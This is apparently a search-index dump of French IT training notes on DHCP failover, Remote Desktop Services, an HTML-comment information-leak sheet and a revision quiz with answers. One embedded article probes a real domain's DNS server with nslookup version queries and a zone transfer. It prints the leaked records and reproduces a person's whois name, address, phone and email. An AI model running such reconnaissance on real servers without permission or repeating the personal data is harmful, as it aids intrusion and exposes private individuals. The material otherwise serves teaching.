</p>"},{"location":"Windows/Serveur/dhcp/dhcp/#pour-aller-plus-loin","title":"Pour aller plus loin","text":"<p>Pour les probl\u00e9matiques de panne et de disponibilit\u00e9 : - Configurer un serveur DHCP \u00ab de secours \u00bb : op\u00e9rationnel, mais non d\u00e9marr\u00e9 - La solution DHCP failover :  (1)</p> <ol> <li> <p>2 modes existent :  </p> <p>Actif / Actif (load balanced)</p> <p>Ce mode est recommande lorsque les 2 serveur DHCP sont situ\u00e9s sur un m\u00eame site g\u00e9ographique. Il est n\u00e9cessaire de d\u00e9finir la r\u00e9partition de charge d\u00e9sir\u00e9e pour \u00e9quilibrer (ou non) la distribution d\u2019adresse IP des 2 serveurs. Chaque serveur se verra attribu\u00e9 une plage d\u2019IP a distribu\u00e9 contenue dans l\u2019\u00e9tendue. Contrairement \u00e0 un serveur DHCP standalone, les IP distribu\u00e9e ne seront donc pas s\u00e9quentielles.</p> <p>Actif / Passif (hot standby)</p> <p>Ce mode est recommand\u00e9 lorsqu\u2019on dispose de 2 serveurs DHCP r\u00e9partis sur 2 sites g\u00e9ographiques diff\u00e9rents.</p> </li> </ol> <p>Pour am\u00e9liorer la s\u00e9curit\u00e9 : - Mettre en place des strat\u00e9gies de filtrage (sur les adresses)  </p> <p>Pour la surveillance et le diagnostic : - Consulter les journaux d\u2019\u00e9v\u00e8nements (source DHCP Server) - Consulter le journal d\u2019audit : 1 fichier .log par jour dans le r\u00e9pertoire de la base  </p>"},{"location":"Windows/Serveur/rds/rds/","title":"RDS - Remote Desktop Services","text":""},{"location":"Windows/Serveur/rds/rds/#principe-de-fonctionnement","title":"Principe de fonctionnement","text":""},{"location":"Windows/Serveur/rds/rds/#client-lourd","title":"Client Lourd","text":"<p>Dans le mod\u00e8le client lourd, les applications sont install\u00e9es sur les postes de travail des utilisateurs.  </p> <ul> <li>La puissance de ceux-ci impacte le fonctionnement de l'application  </li> <li>La gestion des applications est \u00e0 faire sur les postes  </li> </ul> <p></p>"},{"location":"Windows/Serveur/rds/rds/#client-leger","title":"Client L\u00e9ger","text":"<p>Dans le mod\u00e8le client l\u00e9ger, les utilisateurs peuvent travailler depuis de simples terminaux  </p> <ul> <li>La puissance n\u00e9cessaire est fournie par les serveurs  </li> <li>L'installation, configuration et gestions des applications est r\u00e9alis\u00e9e sur les serveurs les h\u00e9bergeant  </li> </ul> <p></p>"},{"location":"Windows/Serveur/rds/rds/#echanges-de-flux","title":"Echanges de flux","text":"<p>Dans une infrastrucure de client l\u00e9ger :  </p> <p>Une partie et/ou la totalit\u00e9 des outils sont d\u00e9port\u00e9es vers les serveurs. Le r\u00e9seau est utilis\u00e9 comme support de transmission. Le protocole utilis\u00e9 pour les \u00e9changes de flux d\u00e9pend de la solution choisie.  </p> <p></p>"},{"location":"Windows/Serveur/rds/rds/#avantages-du-client-leger","title":"Avantages du client l\u00e9ger","text":"<p>Le client l\u00e9ger pr\u00e9sente plusieurs avantage telle que :  </p> <ul> <li>La r\u00e9duction des co\u00fbts :  <ul> <li>Co\u00fbt d'acquisition du mat\u00e9riel et de maintenance, Consommation \u00e9nerg\u00e9tique.  </li> </ul> </li> <li>Un meilleur service :  <ul> <li>Simplification du support et du d\u00e9ploiement.  </li> </ul> </li> <li>R\u00e9ponse \u00e0 des contraintes sp\u00e9cifiques :  <ul> <li>Desserte r\u00e9seau limit\u00e9e, milieux hostiles.  </li> </ul> </li> <li>S\u00e9curit\u00e9 de l'infrastructure :  <ul> <li>Limite les donn\u00e9es locales et la propagation des virus.  </li> </ul> </li> </ul>"},{"location":"Windows/Serveur/rds/rds/#limite-dune-infrastructure-centralisee","title":"Limite d'une infrastructure centralis\u00e9e","text":""},{"location":"Windows/Serveur/rds/rds/#services-apportes-par-rds","title":"Services apport\u00e9s par RDS","text":"<p>Le service RDS permet de mettre \u00e0 disposition des utilisateurs un environnement de bureau complet ou des applications d\u00e9port\u00e9es.  </p> <p></p> <p>Mais \u00e9galement une ou plusieurs machines virtuelles h\u00e9berg\u00e9es (VDI)  </p> <p></p>"},{"location":"Windows/Serveur/rds/rds/#caracteristiques-du-service","title":"Caract\u00e9ristiques du service","text":"<p>Le service RDS est un service :  </p> <p></p> <ul> <li>Multisession  </li> <li>Multi-utilisateurs  </li> </ul> <p>Il permet des acc\u00e8s multiples \u00e0 des environnements d\u00e9di\u00e9s :  </p> RDS : Remote Desktop ServiceRDP : Remote Desktop Protocol <p>R\u00f4le \u00e0 installer sur un serveur Microsoft afin de fournir \u00e0 de multiples utilisateurs des environnements de travail.</p> <p>Protocole utilis\u00e9 afin de v\u00e9hiculer via le r\u00e9seau des informations entre un serveur d'acc\u00e8s distant et ses clients.</p>"},{"location":"Windows/Serveur/rds/rds/#principales-solutions","title":"Principales solutions","text":"<p>Suite \u00e0 la d\u00e9cision de mise en place d'une architecture client l\u00e9ger, il reste \u00e0 d\u00e9terminer sur quels outils celle-ci s'appuiera Voici une liste des solutions les plus pr\u00e9sente sur le march\u00e9 :  </p> Solution Editeur Citrix Virtual Apps and Desktops Citrix Remote Desktop Services Microsoft Parallels Remote Application Server Parallels VMware Horizon VMware <p>Avant de proc\u00e9der \u00e0 l'installation du service, la connaissance des \u00e9tapes et \u00e9l\u00e9ments prenant part au processus est indispensable Avant tout d\u00e9ploiements vous devez avori d\u00e9termin\u00e9 quels serveurs RDS fourniront quels services  </p>"},{"location":"Windows/Serveur/rds/rds/#type-et-scenario-de-deploiement","title":"Type et sc\u00e9nario de d\u00e9ploiement","text":"<p>Le type de d\u00e9ploiement </p> <ul> <li>D\u00e9ploiement standard : Utilis\u00e9 pour d\u00e9ployer le service RDS sur un ensemble de serveurs (permet le ciblage des services de r\u00f4le sur les serveurs souhait\u00e9s).  </li> <li>D\u00e9marrage rapide : Utilis\u00e9 pour d\u00e9ployer les services RDS sur un serveur unique.  </li> </ul> <p>Le sc\u00e9nario de d\u00e9ploiement </p> <ul> <li>D\u00e9ploiement de bureaux bas\u00e9s sur une session : Le service RDS ainsi configur\u00e9 permettra l'utilisation de bureaux virtuels publi\u00e9 et d'applications publi\u00e9es  </li> <li>D\u00e9ploiement de bureaux bas\u00e9s sur un ordinateur virtuel : Permet de mettre en place une solution de VDI afin de mettre \u00e0 disposition des utilisateurs des machines virtuelles compl\u00e8tes via le service RDS.  </li> </ul>"},{"location":"Windows/Serveur/rds/rds/#services-de-role-rds","title":"Services de r\u00f4le RDS","text":"<p>Le r\u00f4le RDS est r\u00e9partie sur six services  </p> <ol> <li>Remote Desktop Connection Broker  </li> <li>Remote Desktop Gateway  </li> <li>Remote Desktop Licensing  </li> <li>Remote Desktop Session Host  </li> <li>Remote Desktop Virtualization Host  </li> <li>Remote Desktop Web Access  </li> </ol> <p>Ces services de r\u00f4les peuvent \u00eatre assur\u00e9s par un m\u00eame serveur RDS ou r\u00e9partis sur plusieurs serveurs RDS. Les quatres fonctions suivantes sont n\u00e9cessaires au fonctionnement d'une infrastructures RDS de bureaux virtuels et d'applications.  </p> <p> </p> <ul> <li>Remote Desktop Connection Broker  </li> <li>Remote Desktop Licensing  </li> <li>Remote Desktop Session Host  </li> <li>Remote Desktop Web Access  </li> </ul>"},{"location":"Windows/Serveur/rds/rds/#outils-de-gestion-du-service","title":"Outils de gestion du service","text":"<p>Depuis la version Serveur 2012, les composants graphiques de gestion du r\u00f4le sont int\u00e9gr\u00e9s au gestionnaire de serveur  </p> <p></p> <p>Le module RemoteDesktop permet la gestion exhaustive du service RDS dans l'environnement PowerShell Pour cela les principales <code>cmdlets</code> pour le d\u00e9ploiement et la configuration du service sont les suivantes :  </p> <pre><code>New-RDSessionDeployment # D\u00e9ploiement et configuration des services de r\u00f4le RDS pour les bureaux bas\u00e9s sur une session  \nNew-RDSessionCollection # Cr\u00e9ation d'une collection  \nNew-RDRemoteAPP         # Publication d'une application RemoteAPP  \n</code></pre>"},{"location":"Windows/Serveur/rds/rds/#creation-dune-collection","title":"Cr\u00e9ation d'une collection","text":"<p>La cr\u00e9ation d'une collection, \u00e0 l'issue du processus d'installation, permet de regrouper un ensemble de serveurs fournissant des services cibl\u00e9s Cela sera n\u00e9cessaire pour :  </p> <ul> <li>La fourniture du service de bureaux distants  </li> <li>La publication d'applications  </li> </ul> <p>Elle peut \u00eatre configurer depuis le Gestionnaire de serveur </p>"},{"location":"Windows/Serveur/rds/rds/#client-dacces","title":"Client d'acc\u00e8s","text":"<p>RDS propose diff\u00e9rents mode de connexion au session de bureau \u00e0 distance.  </p> <ul> <li>Via l'outil Connexion Bureau \u00e0 Distance </li> <li>Via le navigateur web http://nom_dns_ou_ip_du_serveur/rdweb </li> </ul> <p>L'outils Connexion Bureau \u00e0 Distance offre l'avantage d'\u00eatre directement int\u00e9gr\u00e9 aux syst\u00e8mes Microsoft Il permet, notamment via le bouton Afficher les options de configurer l'utilisation de ressources locales, l'utilisation d'\u00e9crans multiples, etc.  </p>"},{"location":"Windows/Serveur/rds/rds/#gestion-des-connexions","title":"Gestion des connexions","text":"<p>Les Gestionnaire de serveur offre la possibilit\u00e9 de g\u00e9rer et visualiser les utlisateurs connect\u00e9s. Diff\u00e9rente action son r\u00e9alisable en effectuant un clic droit sur un utilisateurs  </p> <ul> <li>Envoyer un message,  </li> <li>Prendre un clich\u00e9 (A noter que cette fonction permet la prise en main \u00e0 distance de la session de l'utilisateur),  </li> <li>Fermer la session,  </li> <li>La d\u00e9connexion \u00e0 distance  </li> </ul>"},{"location":"Windows/Serveur/rds/rds/#publication-dapplications","title":"Publication d'applications","text":""},{"location":"cybersecu/dns/","title":"Dns","text":"<p>Faiblesse des serveurs DNS par transfert de zone.    Tip A Friend Enregistrer au format PDF mardi 17 janvier 2006 par g0uZ</p> <p>Le DNS est un maillon essentiel au monde Internet puisqu\u2019il permet de retrouver les serveurs attach\u00e9s \u00e0 un site WEB ou \u00e0 un service FTP par exemple. Ainsi, lorsqu\u2019un utilisateur demande une connexion HTTP, sa requ\u00eate passe obligatoirement par une multitude de serveur DNS chacun d\u00e9livrant une information \u00e0 chaque fois plus pr\u00e9cise jusqu\u2019\u00e0 retrouver la source. C\u2019est litt\u00e9ralement le principe de la toile d\u2019araign\u00e9e : on part d\u2019un bout pour arriver \u00e0 l\u2019autre en passant par un nombre cons\u00e9quent de n\u0153uds. Le DNS, c\u2019est \u00e0 peu pr\u00e8s cela.</p> <p>BIND est l\u2019impl\u00e9mentation la plus r\u00e9pandue du protocole DNS permettant d\u2019assurer la r\u00e9solution des noms de domaines Internet et la correspondance adresse IP et nom de domaine. De nombreuses vuln\u00e9rabilit\u00e9s ont \u00e9t\u00e9 publi\u00e9es durant les derni\u00e8res ann\u00e9es affectant le code propre \u00e0 l\u2019application BIND. Ainsi, sur les serveurs vuln\u00e9rables, ces failles sont susceptibles de provoquer un DOS (d\u00e9ni de service) du service DNS ou l\u2019ex\u00e9cution de commandes arbitraires avec des privil\u00e8ges autres que simple utilisateur, notamment gr\u00e2ce \u00e0 l\u2019exploitation d\u2019un d\u00e9bordement de tampon.</p> <p>N\u00e9anmoins (et bien trop souvent d\u2019ailleurs), on retrouve une faille rudimentaire sur les serveurs DNS qui accorde en lecture un floril\u00e8ge d\u2019informations sensibles. Effectivement, les commandes de transfert afin de mettre \u00e0 jour les serveurs DNS secondaires ne rencontrent pas toujours de restrictions selon les clients. En d\u2019autres termes, chacun \u00e0 la possibilit\u00e9 d\u2019acc\u00e9der \u00e0 ces donn\u00e9es sensibles qui sont retransmises. Il s\u2019agit v\u00e9ritablement d\u2019une mauvaise configuration des serveurs DNS. A cet effet, l\u2019option permettant les appels r\u00e9cursifs est activ\u00e9e par d\u00e9faut avec la version 8 de BIND. Par ailleurs, les administrateurs n\u2019ont pas toujours le r\u00e9flexe de modifier cette impl\u00e9mentation d\u2019origine et dangereuse.</p> <p>Un des moyens de r\u00e9soudre le probl\u00e8me en attendant les correctifs de s\u00e9curit\u00e9 est de d\u00e9sactiver les appels r\u00e9cursifs sur le serveur DNS. Or, dans certains cas, ce n\u2019est \u00e9videmment pas toujours possible, et pour cause : un serveur DNS doit fournir des indications \u00e0 ses sous domaines. N\u00e9anmoins, il faut ajouter que dans les cas ou la suppression de la r\u00e9cursivit\u00e9 n\u2019est pas possible, un contr\u00f4le strict des domaines autoris\u00e9s \u00e0 utiliser un serveur DNS principal de fa\u00e7on r\u00e9cursive peut permettre de limiter les risques d\u2019attaque insidieuse. Il faut alors utiliser l\u2019option [allow-recursion]. Ainsi, il n\u2019est nullement obligatoire de servir les requ\u00eates de transfert de n\u2019importe qui.</p> <p>Pour illustrer notre explication, nous allons justement examiner cette faiblesse au travers d\u2019un exemple r\u00e9el. Nous allons voir qu\u2019un DNS mal configur\u00e9 peut livrer trop d\u2019informations et compromettre ainsi la confidentialit\u00e9 de certains fichiers (dans notre cas clients). Notre exemple se porte sur le portail sp\u00e9cialis\u00e9 dans le jeu Formule FPS NoFrag.com (super site d\u2019ailleurs !) A l\u2019origine, je souhaitais louer les services de leur h\u00e9bergement afin d\u2019h\u00e9berger un serveur Counter Strike ou Day Of Defeat. Avant cela, je voulais d\u2019abord m\u2019assurer du s\u00e9rieux de leur administration et v\u00e9rifier par moi-m\u00eame l\u2019int\u00e9grit\u00e9 de leurs produits. C\u2019est peut \u00eatre discutable comme initiative mais on n\u2019ach\u00e8te pas toujours un produit tant que l\u2019on a pas encore ouvert la bo\u00eete \uf04a</p> <p>Pour d\u00e9buter, effectuons un simple Whois pour informations de base sur le site suivant : www.whois.net | Mais qu\u2019est-ce donc au juste ? Le Whois (de l\u2019anglais \u00ab qui est-ce ? \u00bb) permet d\u2019obtenir des informations l\u00e9gales et administratives des h\u00e9bergements ainsi que des sites selon.</p> <p>Note : En vert figure les commentaires. En bleu les requ\u00eates du client. [www.whois.net] Whois de DodFrance</p> <p>domain:                dodfrance.com owner-address:        DoD France owner-address:        99 Chemin Vert owner-address:        59300 owner-address:        Aulnoy owner-address:        France admin-c:              DS479-GANDI tech-c:                DS479-GANDI bill-c:                DS479-GANDI nserver:              NS.BELOGIC.NET 81.91.66.208 &lt;&lt;&lt; Serveur DNS nserver:              NS.ST-AISE.COM 81.91.66.208 &lt;&lt;&lt; Serveur DNS reg_created:        2001-06-11 12:45:31 expires:        2004-06-11 12:45:31 created:        2001-06-11 18:45:31 changed:        2003-05-24 21:54:21</p> <p>person:        Dubois Samuel nic-hdl:        DS479-GANDI address:        99 Chemin Vert address:        59300 address:        Aulnoy address:        France phone:        06 16 44 47 00 e-mail:        alternativ_fr@hotmail.com</p> <p>Notre Whois nous donne deux adresses IP concernant les serveurs DNS du domaine Dodfrance.com, soit NS.BELOGIC.NET et NS.ST-AISE.COM (m\u00eame IP). Pour tenter une migration des donn\u00e9es relatives \u00e0 ces DNS, nous utiliserons le programme nslookup (pr\u00e9sent sur les distributions Unix et 2000NT) et qui sert justement \u00e0 cet effet. C\u2019est gr\u00e2ce \u00e0 cette application que nous allons \u00e9tablir un contact client avec les serveurs DNS. Ajoutons bri\u00e8vement qu\u2019un serveur DNS utilise le protocole UDP (User Datagram Protocol) pour le passage des donn\u00e9es.</p> <p>Maintenant, passons aux choses s\u00e9rieuses en demandant \u00e0 notre IP 81.91.66.208 la version de BIND. Jusqu\u2019\u00e0 pr\u00e9sent rien ne nous garanti qu\u2019il se produira quelque chose de positif puisque normalement, nous devrions rencontrer une certaine restriction (si le serveur DNS est bien configur\u00e9). Et pourtant . . . Version DNS (81.91.66.208) nonerd.net</p> <p>C:&gt;nslookup Serveur par d\u00e9faut : dnscache-1.proxad.net address: 212.27.39.1 Mon serveur DNS (@free)</p> <p>server 81.91.66.208 Serveur par d\u00e9faut : nonerd.net Address: 81.91.66.208 Aliases: 208.66.91.81.in-addr.arpa</p> <p>set class=chaos set q=txt version.bind Serveur: nonerd.net Address: 81.91.66.208 Aliases: 208.66.91.81.in-addr.arpa</p> <p>VERSION.BIND   text =</p> <pre><code>   \"8.3.6-REL\" Voici la version!\n</code></pre> <p>Nous voici donc avec une version 8.3.6 de BIND. Vous remarquerez que nous obtenons aussi un nom de domaine autre sous l'\u00e9ponyme nonerd.net C'est maintenant que nous allons tenter (avec succ\u00e8s d'ailleurs) un transfert de zone DNS toujours avec nslookup. Voyons le r\u00e9sultat.</p> <p>ls -d nonerd.net [nonerd.net] nonerd.net.                    SOA    nonerd.net root.nonerd.net. (3003103102 3600 900 604800 3600) nonerd.net.                    NS     nonerd.net                   nonerd.net.                    NS     ns6.gandi.net               nonerd.net.                    A      81.91.66.208 sql                            A      81.91.66.208 yooz                           A      81.91.66.208 .yooz                         CNAME  yooz.nonerd.net timoti                         A      81.91.66.208 .timoti                       CNAME  timoti.nonerd.net gallery                        A      81.91.66.208 .gallery                      CNAME  gallery.nonerd.net home                           A      62.4.20.82 comics                         A      62.4.20.82 mail                           A      81.91.66.208 www                            A      81.91.66.208 arabd                          A      81.91.66.208 .arabd                        CNAME  arabd.nonerd.net ftp                            A      81.91.66.208 nonerd.net.                    SOA    nonerd.net root.nonerd.net. (3003103102 3600 900 604800 3600)</p> <p>Il y a certains aspects int\u00e9ressants \u00e0 cette petite impression sur \u00e9cran, mais manifestement, les abr\u00e9viations ne nous semble pas coutumi\u00e8res. A cet effet, prenons le temps de donner une claire explications des diff\u00e9rentes abr\u00e9viations rencontr\u00e9es :</p> <p>SOA - [Start Of Authority] d\u00e9crit le DNS faisant r\u00e9f\u00e9rence ainsi que diff\u00e9rentes valeurs indiquant la dur\u00e9e de validit\u00e9 des informations et l\u2019adresse @mail du responsable de la zone.</p> <p>NS - [Name Server] d\u00e9signe les serveurs de noms pour la zone interrog\u00e9e.</p> <p>A - [Address] fait correspondre un nom (ou service) \u00e0 une adresse IP. Dans notre log, nous trouvons notamment un serveur FTP (pure ftpd, vuln\u00e9rable BOF), un service de messagerie, etc.</p> <p>CNAME - [Alias Name] Cette possibilit\u00e9 est particuli\u00e8rement utilis\u00e9e pour l\u2019h\u00e9bergement mutualis\u00e9 lorsque plusieurs sites WEB sont h\u00e9berg\u00e9s sur le m\u00eame serveur.</p> <p>D\u2019autres abr\u00e9viations existent mais ne sont pas inscrites dans notre log d\u2019exemple sur nonerd. N\u00e9anmoins, expliquons notamment MX qui correspond \u00e0 un service de messagerie, PTR pour une correspondance entre une IP et une adresse, etc.</p> <p>Il est int\u00e9ressant de consid\u00e9rer la r\u00e9ponse via une requ\u00eate de transfert sur le DNS ns6.gandi.net (d\u2019ailleurs, la r\u00e9ponse correspond \u00e0 une bonne configuration). Apr\u00e8s, nous demanderons la version BIND du DNS secondaire.</p> <p>Request query sur ns6.gandi.net</p> <p>ls -d 80.67.173.196 [ns6.gandi.net] *** Impossible de fournir la liste du domaine 80.67.173.196\u00ff : Query refused</p> <p>C :&gt;nslookup Serveur par d\u00e9faut : dnscache-1.proxad.net address : 212.27.39.1</p> <p>server 80.67.173.196 Serveur par d\u00e9faut : nonerd.net Address : 80.67.173.196</p> <p>set class=chaos set q=txt version.bind Serveur : ns6.gandi.net Address : 80.67.173.196</p> <p>VERSION.BIND text =</p> <p>\"8.3.1-REL-NOESW\"</p> <p>En finalit\u00e9, nous avons donc plusieurs sites \u00e0 visit\u00e9s (CNAME soit les aliases) sur notre IP [81.91.66.208]. Nous sommes en pr\u00e9sence de 3 sites valides en partage sur le m\u00eame serveur selon expression \u2019mutualis\u00e9\u2019 :</p> <p>1\u00b0 http://gallery.nonerd.net [NoNerd Family Gallery] 2\u00b0 http://timoti.nonerd.net [Etrange site sur l\u2019art contemporain] 3\u00b0 http://yooz.nonerd.net [Idem mais orient\u00e9 Art plastique]</p> <p>Bien que le transfert de zone ne soit pas explicitement responsable des diff\u00e9rentes faiblesses de ce domaine, il accorde n\u00e9anmoins une certaine transparence et donne une image plus pr\u00e9cise de la cible. Le plus int\u00e9ressant aurait \u00e9t\u00e9 de placer une restriction afin de garantir l\u2019opacit\u00e9 des susdites informations sensibles. Pr\u00e9sentement, il y a l\u00e0 un moyen tr\u00e8s simple de discerner si un site ou un serveur h\u00e9berge \u00e9ventuellement un script PHP vuln\u00e9rable, un service ayant une faiblesse particuli\u00e8re ou d\u2019autres choses encore.</p> <p>Terminons cet examen en affirmant qu\u2019apr\u00e8s avoir \u00e9t\u00e9 pr\u00e9venu, l\u2019administrateur consciencieux a prit les dispositions ad\u00e9quats. Ainsi, les services de nonerd.net sont selon une attente l\u00e9gitime.</p> <p>l33t sk1llz ++</p>"},{"location":"cybersecu/html_code_source/","title":"HTML - Code Source","text":""},{"location":"cybersecu/html_code_source/#description","title":"Description","text":"<p>Le code source HTML peut contenir des commentaires sensibles qui sont ins\u00e9r\u00e9s dans le code HTML d\u2019une page web, mais qui ne sont pas visibles pour l\u2019utilisateur final. Les commentaires sont g\u00e9n\u00e9ralement utilis\u00e9s par les d\u00e9veloppeurs pour ajouter des notes ou des informations suppl\u00e9mentaires sur le code, mais ils peuvent \u00e9galement \u00eatre utilis\u00e9s pour cacher des informations sensibles comme des mots de passe ou des cl\u00e9s d\u2019API.  </p>"},{"location":"cybersecu/html_code_source/#prerequis-dexploitation","title":"Pr\u00e9requis d\u2019exploitation","text":"<p>Pour exploiter cette vuln\u00e9rabilit\u00e9, il est n\u00e9cessaire d\u2019avoir acc\u00e8s \u00e0 une application qui comporte des commentaires HTML.  </p>"},{"location":"cybersecu/html_code_source/#connaissances-necessaires","title":"Connaissances n\u00e9cessaires","text":"<ul> <li>Reconna\u00eetre des commentaires HTML dans une page web.  </li> </ul>"},{"location":"cybersecu/html_code_source/#outils-necessaires","title":"Outils n\u00e9cessaires","text":"<ul> <li>Avoir acc\u00e8s \u00e0 une console de navigateur (Firefox, Chrome).  </li> </ul>"},{"location":"cybersecu/html_code_source/#flux-dexecution","title":"Flux d\u2019ex\u00e9cution","text":""},{"location":"cybersecu/html_code_source/#explorer","title":"Explorer","text":"<p>Naviguer sur l\u2019application pour r\u00e9cup\u00e9rer les endpoints et/ou pages de l\u2019application puis analyser le code HTML de chaque page.  </p>"},{"location":"cybersecu/html_code_source/#experimenter","title":"Exp\u00e9rimenter","text":"<p>Tenter de trouver des commentaires en HTML cach\u00e9s dans le code source de la page et analyser leur contenu.  </p>"},{"location":"cybersecu/html_code_source/#exploiter","title":"Exploiter","text":"<p>Consulter les solutions de chaque challenge.  </p>"},{"location":"cybersecu/html_code_source/#consequences-potentielles","title":"Cons\u00e9quences potentielles","text":"<p>Une exploitation r\u00e9ussie de ce type de vuln\u00e9rabilit\u00e9 peut permettre :  </p> <ul> <li>L\u2019acc\u00e8s \u00e0 des informations sensibles telles que des identifiants de connexion ;  </li> <li>La recherche de vuln\u00e9rabilit\u00e9s en \u00e9num\u00e9rant le fonctionnement ou la/les version(s) des composants de l\u2019application.  </li> </ul>"},{"location":"cybersecu/html_code_source/#contre-mesures","title":"Contre-mesures","text":"<p>Les contre-mesures suivantes peuvent \u00eatre mises en \u0153uvre :  </p> <ul> <li>Ne pas inclure d\u2019informations sensibles dans les commentaires en HTML ;  </li> <li>Utiliser des contr\u00f4les d\u2019acc\u00e8s bas\u00e9s sur les r\u00f4les et les autorisations pour limiter l\u2019acc\u00e8s aux pages web contenant des commentaires sensibles ;  </li> <li>Utiliser un pare-feu applicatif pour bloquer les requ\u00eates HTTP non autoris\u00e9es ou suspectes.  </li> </ul>"},{"location":"cybersecu/html_code_source/#mise-en-pratique","title":"Mise en pratique","text":"<p>Les sc\u00e9narios suivants peuvent \u00eatre jou\u00e9s via l\u2019exploitation de cette vuln\u00e9rabilit\u00e9 :  </p> <ul> <li>L\u2019utilisation d\u2019informations confidentielles pour se connecter sur un espace prot\u00e9g\u00e9 par un mot de passe ;  </li> <li>L\u2019\u00e9num\u00e9ration d\u2019informations sensibles sur le serveur ou l\u2019application afin de mener une attaque.  </li> </ul>"},{"location":"cybersecu/html_code_source/#exemple-1","title":"Exemple 1","text":"<p>Voici un exemple de page HTML simple contenant un commentaire qui fournit des identifiants en clair :  </p> <p><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n   &lt;head&gt;\n       &lt;title&gt;Exemple de commentaire sensible&lt;/title&gt;\n   &lt;/head&gt;\n   &lt;body&gt;\n       &lt;h1&gt;Bienvenue sur notre site web&lt;/h1&gt;\n       &lt;!-- Identifiants: login: admin, mot de passe: secret --&gt;\n   &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Dans cet exemple, le commentaire HTML cach\u00e9 dans le code contient les identifiants de connexion (login : \"admin\", mot de passe : \"secret\"). Si cette page est accessible \u00e0 un attaquant, il peut facilement r\u00e9cup\u00e9rer ces informations sensibles et les utiliser pour acc\u00e9der au syst\u00e8me.  </p>"},{"location":"cybersecu/html_code_source/#exemple-2","title":"Exemple 2","text":"<p>Voici un exemple de page HTML simple contenant un commentaire qui indique la pr\u00e9sence d\u2019une page de debug de l\u2019application :  </p> <p><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n   &lt;head&gt;\n       &lt;title&gt;Exemple de lien sensible&lt;/title&gt;\n   &lt;/head&gt;\n   &lt;body&gt;\n       &lt;h1&gt;Bienvenue sur notre site web&lt;/h1&gt;\n       &lt;!-- &lt;a href=\"/utils/debug_dev.php\"&gt;Debug&lt;/a&gt;--&gt;\n   &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Dans cet exemple, le commentaire HTML cach\u00e9 dans le code contient un lien vers la page \"/utils/debug_dev.php\" qui semble \u00eatre une page de debug \u00e0 destination des \u00e9quipes de d\u00e9veloppement.  </p>"},{"location":"cybersecu/html_code_source/#references","title":"R\u00e9f\u00e9rences","text":""},{"location":"cybersecu/html_code_source/#cwes","title":"CWEs","text":"<p>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor CWE-540: Inclusion of Sensitive Information in Source Code CWE-615: Inclusion of Sensitive Information in Source code Comments </p>"},{"location":"cybersecu/html_code_source/#url","title":"URL","text":"<p>Debuter_avec__html.pdf Langage HTML Tuto HTML Le Langage HTML </p>"},{"location":"revision/revision/","title":"Exercice revision ENI","text":"<p>Chapitre 1 Pr\u00e9sentation des concepts r\u00e9seau  </p> <p>Mots-cl\u00e9s : Configuration IP, acc\u00e8s internet, historique, ISO, service r\u00e9seau, notions sur les r\u00e9seaux, RAID 5, \u00e9quilibre de charge, Windows Server 2022, Service Web, Test de connectivit\u00e9.  </p> <p>Objectif : Permettre d'acqu\u00e9rir les notions li\u00e9es au r\u00e9seau : - historique du r\u00e9seau, - protocoles et applicatifs dans des environnements clients/serveurs, - Concepts li\u00e9s \u00e0 la s\u00e9curit\u00e9, - La protection, - La virtualisation  </p> <p>Mise en oeuvre d'un environnement virtuel impliquant : - Un serveur Windows 2022, - Un ordinateur Linux CentOS Stream 9.  </p> <p>L'environnement sera utilis\u00e9 dans les chapitres suivants pour r\u00e9aliser des op\u00e9rations concr\u00e8tes.  </p> <p>Pr\u00e9requis </p> Pr\u00e9cisez, dans la liste ci-dessous, ce qui ne constitue pas un syst\u00e8me d'exploitation : <ul> <li> Windows</li> <li> Unix</li> <li> SMTP</li> <li> Linux</li> <li> Novell</li> <li> DOS</li> </ul> Correction Correction <ul> <li> Windows</li> <li> Unix</li> <li> SMTP</li> <li> Linux</li> <li> Novell</li> <li> DOS</li> </ul> Citez trois exemples de syst\u00e8mes de fichiers : Correction Correction <p>Un File System ou syst\u00e8me de fichiers permet de d\u00e9finir la mani\u00e8re dont les donn\u00e9es seront stock\u00e9es sur une portion d'un disque, appel\u00e9e en g\u00e9n\u00e9ral partition. Il existe des syst\u00e8mes de fichiers s\u00e9curis\u00e9s qui permettent de g\u00e9rer des acc\u00e8s diff\u00e9rents suivant les utilisateurs concern\u00e9s ou des syst\u00e8mes de fichiers transactionnels qui proposent un acc\u00e8s suivi des op\u00e9rations d'\u00e9criture. Les exemples suivants peuvent \u00eatre cit\u00e9s : - FAT32 (File Allocation Table) syst\u00e8me de fichiers utilis\u00e9 sous de nombreuses versions de Windows, - NTFS (New Technology File System) qui propose un acc\u00e8s s\u00e9curis\u00e9 sous Windows Server 2022 ou Windows 11, - EXT4 ou XFS sous Linux, - UFS sous UNIX (Solaris)  </p> Pr\u00e9cisez, dans la liste ci-dessous, les \u00e9l\u00e9ments associ\u00e9s \u00e0 un environnement d'impression : <ul> <li> File d'attente</li> <li> P\u00e9riph\u00e9rique d'impression</li> <li> Carte SCSI</li> <li> Pilote</li> <li> C\u00e2ble r\u00e9seau</li> </ul> Correction Correction <ul> <li> File d'attente permet de placer en attente les documents pr\u00eats \u00e0 \u00eatre imprim\u00e9s.  </li> <li> P\u00e9riph\u00e9rique d'impression il constitue l'imprimante \u00e0 proprement parler; attention de nombreux OS d\u00e9nomment la file d'attente imprimante</li> <li> Carte SCSI Il s'agit d'une carte g\u00e9n\u00e9ralement utilis\u00e9e pour relier plusierus disques, offrant ainsi un sous-syst\u00e8me disque tr\u00e8s performant. Bien qu'un espace disque ou m\u00e9moire soit n\u00e9cessaire pour stocker les documents plac\u00e9s en attente dans la file d'attente, cette r\u00e9ponse n'est pas consid\u00e9r\u00e9e comme une bonne r\u00e9ponse.  </li> <li> Pilote Un pilote d'impression est n\u00e9cessaire pour formater les donn\u00e9es dans un langage adapt\u00e9 au p\u00e9riph\u00e9rique d'impression utilis\u00e9 (ex: PostScript ou PCL, Printer Command Languages).  </li> <li> C\u00e2ble r\u00e9seau IL est parfois n\u00e9cessaire lorsque le p\u00e9riph\u00e9rique doit \u00eatre directement connect\u00e9 au r\u00e9seau et non \u00e0 un ordinateur. Cependant, de nombreux p\u00e9riph\u00e9riques d'impression sont accessibles par le biais d'un serveur d'impression sur lequel est branch\u00e9 localement le p\u00e9riph\u00e9rique.</li> </ul> Quelles affirmations parmi les suivantes sont v\u00e9rifi\u00e9es ? <ul> <li> Un fichier peut \u00eatre 